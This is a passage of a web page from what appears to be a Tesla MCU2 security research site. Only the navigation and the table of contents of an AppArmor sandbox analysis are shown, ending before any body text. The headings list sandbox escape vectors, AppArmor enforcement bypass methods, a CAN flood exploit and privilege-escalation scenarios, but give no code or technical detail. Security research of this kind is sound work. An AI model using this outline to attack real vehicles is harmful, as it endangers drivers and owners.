<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Comprehensive security analysis of Tesla Model S/X/3/Y MCU2 and Gateway"><meta name=author content="Security Researcher"><link href=https://talas9.github.io/tesla-research/mcu/31-apparmor-sandbox-security/ rel=canonical><link href=../28-can-flood-refined-timing/ rel=prev><link href=../../evidence/59-EVIDENCE-AUDIT/ rel=next><link rel=icon href=../../assets/images/favicon.png><meta name=generator content="mkdocs-1.6.1, mkdocs-material-9.7.1"><title>AppArmor Sandbox - Tesla MCU2 Security Research</title><link rel=stylesheet href=../../assets/stylesheets/main.484c7ddc.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.ab4e12ef.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><link rel=stylesheet href=../../stylesheets/extra.css><script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=red data-md-color-accent=red> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#apparmor-sandbox-security-analysis class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--shadow md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../.. title="Tesla MCU2 Security Research" class="md-header__button md-logo" aria-label="Tesla MCU2 Security Research" data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> Tesla MCU2 Security Research </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> AppArmor Sandbox </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media data-md-color-scheme=slate data-md-color-primary=red data-md-color-accent=red aria-label="Switch to light mode" type=radio name=__palette id=__palette_0> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg> </label> <input class=md-option data-md-color-media data-md-color-scheme=default data-md-color-primary=red data-md-color-accent=red aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_0 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg> </label> </form> <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" title=Share aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg> </a> <button type=reset class="md-search__icon md-icon" title=Clear aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap tabindex=0 data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list role=presentation></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/talas9/tesla-research title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg> </div> <div class=md-source__repository> talas9/tesla-research </div> </a> </div> </nav> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class=md-grid> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> Home </a> </li> <li class=md-tabs__item> <a href=../../INDEX/ class=md-tabs__link> Complete Index </a> </li> <li class=md-tabs__item> <a href=../../core/00-master-cross-reference/ class=md-tabs__link> Core Research </a> </li> <li class=md-tabs__item> <a href=../../gateway/81-gateway-secure-configs-CRITICAL/ class=md-tabs__link> Gateway Security </a> </li> <li class="md-tabs__item md-tabs__item--active"> <a href=../24-vcsec-key-programming/ class=md-tabs__link> MCU Research </a> </li> <li class=md-tabs__item> <a href=../../evidence/59-EVIDENCE-AUDIT/ class=md-tabs__link> Evidence & Audit </a> </li> <li class=md-tabs__item> <a href=../../tools/56-gateway-factory-gate-REAL/ class=md-tabs__link> Tools & Scripts </a> </li> </ul> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title="Tesla MCU2 Security Research" class="md-nav__button md-logo" aria-label="Tesla MCU2 Security Research" data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg> </a> Tesla MCU2 Security Research </label> <div class=md-nav__source> <a href=https://github.com/talas9/tesla-research title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg> </div> <div class=md-source__repository> talas9/tesla-research </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> <span class=md-ellipsis> Home </span> </a> </li> <li class=md-nav__item> <a href=../../INDEX/ class=md-nav__link> <span class=md-ellipsis> Complete Index </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3 id=__nav_3_label tabindex=0> <span class=md-ellipsis> Core Research </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_3_label aria-expanded=false> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Core Research </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../core/00-master-cross-reference/ class=md-nav__link> <span class=md-ellipsis> Master Cross-Reference </span> </a> </li> <li class=md-nav__item> <a href=../../core/02-gateway-can-flood-exploit/ class=md-nav__link> <span class=md-ellipsis> Gateway CAN Flood Exploit </span> </a> </li> <li class=md-nav__item> <a href=../../core/03-certificate-recovery-orphan-cars/ class=md-nav__link> <span class=md-ellipsis> Certificate Recovery </span> </a> </li> <li class=md-nav__item> <a href=../../core/04-network-ports-firewall/ class=md-nav__link> <span class=md-ellipsis> Network Topology </span> </a> </li> <li class=md-nav__item> <a href=../../core/06-usb-firmware-update/ class=md-nav__link> <span class=md-ellipsis> USB Firmware Update </span> </a> </li> <li class=md-nav__item> <a href=../../core/07-usb-map-installation/ class=md-nav__link> <span class=md-ellipsis> USB Map Installation </span> </a> </li> <li class=md-nav__item> <a href=../../core/08-key-programming-vcsec/ class=md-nav__link> <span class=md-ellipsis> Key Programming </span> </a> </li> <li class=md-nav__item> <a href=../../core/13-ota-handshake-protocol/ class=md-nav__link> <span class=md-ellipsis> OTA Protocol </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_4> <label class=md-nav__link for=__nav_4 id=__nav_4_label tabindex=0> <span class=md-ellipsis> Gateway Security </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_4_label aria-expanded=false> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> Gateway Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../gateway/81-gateway-secure-configs-CRITICAL/ class=md-nav__link> <span class=md-ellipsis> ðŸ”’ CRITICAL: Secure Configs </span> </a> </li> <li class=md-nav__item> <a href=../../gateway/80-ryzen-gateway-flash-COMPLETE/ class=md-nav__link> <span class=md-ellipsis> âœ… Complete Flash Dump </span> </a> </li> <li class=md-nav__item> <a href=../../gateway/82-odin-routines-database-UNHASHED/ class=md-nav__link> <span class=md-ellipsis> ðŸ”“ Odin Database </span> </a> </li> <li class=md-nav__item> <a href=../../gateway/92-config-metadata-table-FOUND/ class=md-nav__link> <span class=md-ellipsis> ðŸŽ¯ Config Metadata Table </span> </a> </li> <li class=md-nav__item> <a href=../../gateway/83-odin-config-api-analysis/ class=md-nav__link> <span class=md-ellipsis> Odin Config API </span> </a> </li> <li class=md-nav__item> <a href=../../gateway/84-gw-diag-command-reference/ class=md-nav__link> <span class=md-ellipsis> gw-diag Commands </span> </a> </li> <li class=md-nav__item> <a href=../../gateway/88-gateway-strings-analysis/ class=md-nav__link> <span class=md-ellipsis> Gateway Strings </span> </a> </li> <li class=md-nav__item> <a href=../../gateway/91-gateway-powerpc-disassembly-summary/ class=md-nav__link> <span class=md-ellipsis> PowerPC Disassembly </span> </a> </li> <li class=md-nav__item> <a href=../../gateway/94-gateway-ALL-FUNCTIONS/ class=md-nav__link> <span class=md-ellipsis> All Functions </span> </a> </li> <li class=md-nav__item> <a href=../../gateway/95-gateway-CAN-MESSAGES-COMPLETE/ class=md-nav__link> <span class=md-ellipsis> CAN Messages Complete </span> </a> </li> <li class=md-nav__item> <a href=../../gateway/96-gateway-DATA-TABLES/ class=md-nav__link> <span class=md-ellipsis> All Data Tables </span> </a> </li> <li class=md-nav__item> <a href=../../gateway/97-gateway-MEMORY-MAP/ class=md-nav__link> <span class=md-ellipsis> Memory Map </span> </a> </li> <li class=md-nav__item> <a href=../../gateway/98-SHA-256-USAGE-ANALYSIS/ class=md-nav__link> <span class=md-ellipsis> SHA-256 Usage </span> </a> </li> <li class=md-nav__item> <a href=../../gateway/99-gateway-FIRMWARE-METADATA/ class=md-nav__link> <span class=md-ellipsis> Firmware Metadata </span> </a> </li> <li class=md-nav__item> <a href=../../gateway/55-gateway-spc-chip-replacement/ class=md-nav__link> <span class=md-ellipsis> SPC Chip Replacement </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_5 checked> <label class=md-nav__link for=__nav_5 id=__nav_5_label tabindex> <span class=md-ellipsis> MCU Research </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_5_label aria-expanded=true> <label class=md-nav__title for=__nav_5> <span class="md-nav__icon md-icon"></span> MCU Research </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../24-vcsec-key-programming/ class=md-nav__link> <span class=md-ellipsis> VCSEC Key Programming </span> </a> </li> <li class=md-nav__item> <a href=../25-mcu-boot-sequence.md class=md-nav__link> <span class=md-ellipsis> Boot Sequence </span> </a> </li> <li class=md-nav__item> <a href=../28-can-flood-refined-timing/ class=md-nav__link> <span class=md-ellipsis> CAN Flood Timing </span> </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> <span class=md-ellipsis> AppArmor Sandbox </span> <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> <span class=md-ellipsis> AppArmor Sandbox </span> </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#executive-summary class=md-nav__link> <span class=md-ellipsis> Executive Summary </span> </a> </li> <li class=md-nav__item> <a href=#1-apparmor-profile-inventory class=md-nav__link> <span class=md-ellipsis> 1. AppArmor Profile Inventory </span> </a> <nav class=md-nav aria-label="1. AppArmor Profile Inventory"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#11-profile-statistics class=md-nav__link> <span class=md-ellipsis> 1.1 Profile Statistics </span> </a> </li> <li class=md-nav__item> <a href=#12-compiled-profiles-sample class=md-nav__link> <span class=md-ellipsis> 1.2 Compiled Profiles (Sample) </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2-service-shell-profile-analysis class=md-nav__link> <span class=md-ellipsis> 2. Service-Shell Profile Analysis </span> </a> <nav class=md-nav aria-label="2. Service-Shell Profile Analysis"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#21-base-profile-service-shell class=md-nav__link> <span class=md-ellipsis> 2.1 Base Profile: service-shell </span> </a> </li> <li class=md-nav__item> <a href=#22-engineering-profile-service-shell-service-engineering class=md-nav__link> <span class=md-ellipsis> 2.2 Engineering Profile: service-shell-service-engineering </span> </a> <nav class=md-nav aria-label="2.2 Engineering Profile: service-shell-service-engineering"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#binps-process-inspection class=md-nav__link> <span class=md-ellipsis> /bin/ps - Process Inspection </span> </a> </li> <li class=md-nav__item> <a href=#usrsbinnvme-nvme-admin class=md-nav__link> <span class=md-ellipsis> /usr/sbin/nvme - NVMe Admin </span> </a> </li> <li class=md-nav__item> <a href=#binrm-file-deletion class=md-nav__link> <span class=md-ellipsis> /bin/rm - File Deletion </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#23-tcp-common-profile-service-shell-tcp-common class=md-nav__link> <span class=md-ellipsis> 2.3 TCP Common Profile: service-shell-tcp-common </span> </a> </li> <li class=md-nav__item> <a href=#24-allowed-files class=md-nav__link> <span class=md-ellipsis> 2.4 Allowed Files </span> </a> </li> <li class=md-nav__item> <a href=#25-blocked-files class=md-nav__link> <span class=md-ellipsis> 2.5 Blocked Files </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#3-escalator-binary-analysis class=md-nav__link> <span class=md-ellipsis> 3. Escalator Binary Analysis </span> </a> <nav class=md-nav aria-label="3. Escalator Binary Analysis"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#31-overview class=md-nav__link> <span class=md-ellipsis> 3.1 Overview </span> </a> </li> <li class=md-nav__item> <a href=#32-escalator-profiles class=md-nav__link> <span class=md-ellipsis> 3.2 Escalator Profiles </span> </a> </li> <li class=md-nav__item> <a href=#33-escalator-exec-profile-unconfined-transitions class=md-nav__link> <span class=md-ellipsis> 3.3 Escalator Exec Profile - Unconfined Transitions </span> </a> </li> <li class=md-nav__item> <a href=#34-escalator-rwfile-profile class=md-nav__link> <span class=md-ellipsis> 3.4 Escalator RWFile Profile </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#4-sandboxbash-implementation class=md-nav__link> <span class=md-ellipsis> 4. Sandbox.bash Implementation </span> </a> <nav class=md-nav aria-label="4. Sandbox.bash Implementation"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#41-overview class=md-nav__link> <span class=md-ellipsis> 4.1 Overview </span> </a> </li> <li class=md-nav__item> <a href=#42-key-functions class=md-nav__link> <span class=md-ellipsis> 4.2 Key Functions </span> </a> <nav class=md-nav aria-label="4.2 Key Functions"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#runsandbox-main-execution class=md-nav__link> <span class=md-ellipsis> RunSandbox - Main Execution </span> </a> </li> <li class=md-nav__item> <a href=#createchrootskeleton-chroot-preparation class=md-nav__link> <span class=md-ellipsis> CreateChrootSkeleton - Chroot Preparation </span> </a> </li> <li class=md-nav__item> <a href=#network-namespace-setup class=md-nav__link> <span class=md-ellipsis> Network Namespace Setup </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#43-sandbox-profile-loading class=md-nav__link> <span class=md-ellipsis> 4.3 Sandbox Profile Loading </span> </a> </li> <li class=md-nav__item> <a href=#44-apparmor-integration class=md-nav__link> <span class=md-ellipsis> 4.4 AppArmor Integration </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#5-minijail0-sandbox-configurations class=md-nav__link> <span class=md-ellipsis> 5. Minijail0 Sandbox Configurations </span> </a> <nav class=md-nav aria-label="5. Minijail0 Sandbox Configurations"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#51-updater-envoy-profile class=md-nav__link> <span class=md-ellipsis> 5.1 Updater-Envoy Profile </span> </a> </li> <li class=md-nav__item> <a href=#52-chromium-sandbox-profile class=md-nav__link> <span class=md-ellipsis> 5.2 Chromium Sandbox Profile </span> </a> </li> <li class=md-nav__item> <a href=#53-kafel-seccomp-filters class=md-nav__link> <span class=md-ellipsis> 5.3 Kafel Seccomp Filters </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#6-capability-grants-summary class=md-nav__link> <span class=md-ellipsis> 6. Capability Grants Summary </span> </a> <nav class=md-nav aria-label="6. Capability Grants Summary"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#61-dangerous-capabilities-granted class=md-nav__link> <span class=md-ellipsis> 6.1 Dangerous Capabilities Granted </span> </a> </li> <li class=md-nav__item> <a href=#62-capability-grant-breakdown class=md-nav__link> <span class=md-ellipsis> 6.2 Capability Grant Breakdown </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#7-sandbox-escape-vectors class=md-nav__link> <span class=md-ellipsis> 7. Sandbox Escape Vectors </span> </a> <nav class=md-nav aria-label="7. Sandbox Escape Vectors"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#71-vector-1-service-shell-escalator-unconfined-script class=md-nav__link> <span class=md-ellipsis> 7.1 Vector 1: Service-Shell â†’ Escalator â†’ Unconfined Script </span> </a> </li> <li class=md-nav__item> <a href=#72-vector-2-apparmor-profile-reload class=md-nav__link> <span class=md-ellipsis> 7.2 Vector 2: AppArmor Profile Reload </span> </a> </li> <li class=md-nav__item> <a href=#73-vector-3-network-namespace-escape class=md-nav__link> <span class=md-ellipsis> 7.3 Vector 3: Network Namespace Escape </span> </a> </li> <li class=md-nav__item> <a href=#74-vector-4-chroot-escape-via-proc class=md-nav__link> <span class=md-ellipsis> 7.4 Vector 4: Chroot Escape via /proc </span> </a> </li> <li class=md-nav__item> <a href=#75-vector-5-gaming-partition-write class=md-nav__link> <span class=md-ellipsis> 7.5 Vector 5: Gaming Partition Write </span> </a> </li> <li class=md-nav__item> <a href=#76-vector-6-usb-format-attack class=md-nav__link> <span class=md-ellipsis> 7.6 Vector 6: USB Format Attack </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#8-file-access-boundaries class=md-nav__link> <span class=md-ellipsis> 8. File Access Boundaries </span> </a> <nav class=md-nav aria-label="8. File Access Boundaries"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#81-read-only-access class=md-nav__link> <span class=md-ellipsis> 8.1 Read-Only Access </span> </a> </li> <li class=md-nav__item> <a href=#82-write-access class=md-nav__link> <span class=md-ellipsis> 8.2 Write Access </span> </a> </li> <li class=md-nav__item> <a href=#83-credential-access class=md-nav__link> <span class=md-ellipsis> 8.3 Credential Access </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#9-profile-loading-enforcement-bypass class=md-nav__link> <span class=md-ellipsis> 9. Profile Loading &amp; Enforcement Bypass </span> </a> <nav class=md-nav aria-label="9. Profile Loading & Enforcement Bypass"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#91-apparmor-profile-loading class=md-nav__link> <span class=md-ellipsis> 9.1 AppArmor Profile Loading </span> </a> </li> <li class=md-nav__item> <a href=#92-enforcement-bypass-method-1-profile-replacement class=md-nav__link> <span class=md-ellipsis> 9.2 Enforcement Bypass Method 1: Profile Replacement </span> </a> </li> <li class=md-nav__item> <a href=#93-enforcement-bypass-method-2-unconfined-transitions class=md-nav__link> <span class=md-ellipsis> 9.3 Enforcement Bypass Method 2: Unconfined Transitions </span> </a> </li> <li class=md-nav__item> <a href=#94-enforcement-bypass-method-3-profile-stacking-bug class=md-nav__link> <span class=md-ellipsis> 9.4 Enforcement Bypass Method 3: Profile Stacking Bug </span> </a> </li> <li class=md-nav__item> <a href=#95-enforcement-status-check class=md-nav__link> <span class=md-ellipsis> 9.5 Enforcement Status Check </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#10-overly-permissive-profiles class=md-nav__link> <span class=md-ellipsis> 10. Overly Permissive Profiles </span> </a> <nav class=md-nav aria-label="10. Overly Permissive Profiles"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#101-service-shell-base-profile class=md-nav__link> <span class=md-ellipsis> 10.1 Service-Shell Base Profile </span> </a> </li> <li class=md-nav__item> <a href=#102-escalator-exec-profile class=md-nav__link> <span class=md-ellipsis> 10.2 Escalator Exec Profile </span> </a> </li> <li class=md-nav__item> <a href=#103-binrm-profile class=md-nav__link> <span class=md-ellipsis> 10.3 Bin/Rm Profile </span> </a> </li> <li class=md-nav__item> <a href=#104-ip-command-profile class=md-nav__link> <span class=md-ellipsis> 10.4 IP Command Profile </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#11-sandbox-effectiveness-assessment class=md-nav__link> <span class=md-ellipsis> 11. Sandbox Effectiveness Assessment </span> </a> <nav class=md-nav aria-label="11. Sandbox Effectiveness Assessment"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#111-defense-in-depth-layers class=md-nav__link> <span class=md-ellipsis> 11.1 Defense-in-Depth Layers </span> </a> </li> <li class=md-nav__item> <a href=#112-strengths class=md-nav__link> <span class=md-ellipsis> 11.2 Strengths </span> </a> </li> <li class=md-nav__item> <a href=#113-weaknesses class=md-nav__link> <span class=md-ellipsis> 11.3 Weaknesses </span> </a> </li> <li class=md-nav__item> <a href=#114-comparison-to-industry-standards class=md-nav__link> <span class=md-ellipsis> 11.4 Comparison to Industry Standards </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#12-exploit-scenarios class=md-nav__link> <span class=md-ellipsis> 12. Exploit Scenarios </span> </a> <nav class=md-nav aria-label="12. Exploit Scenarios"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#121-scenario-a-service-mode-to-root class=md-nav__link> <span class=md-ellipsis> 12.1 Scenario A: Service-Mode to Root </span> </a> </li> <li class=md-nav__item> <a href=#122-scenario-b-chromium-sandbox-escape class=md-nav__link> <span class=md-ellipsis> 12.2 Scenario B: Chromium Sandbox Escape </span> </a> </li> <li class=md-nav__item> <a href=#123-scenario-c-ota-update-corruption class=md-nav__link> <span class=md-ellipsis> 12.3 Scenario C: OTA Update Corruption </span> </a> </li> <li class=md-nav__item> <a href=#124-scenario-d-gaming-partition-backdoor class=md-nav__link> <span class=md-ellipsis> 12.4 Scenario D: Gaming Partition Backdoor </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#13-mitigation-recommendations class=md-nav__link> <span class=md-ellipsis> 13. Mitigation Recommendations </span> </a> <nav class=md-nav aria-label="13. Mitigation Recommendations"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#131-high-priority class=md-nav__link> <span class=md-ellipsis> 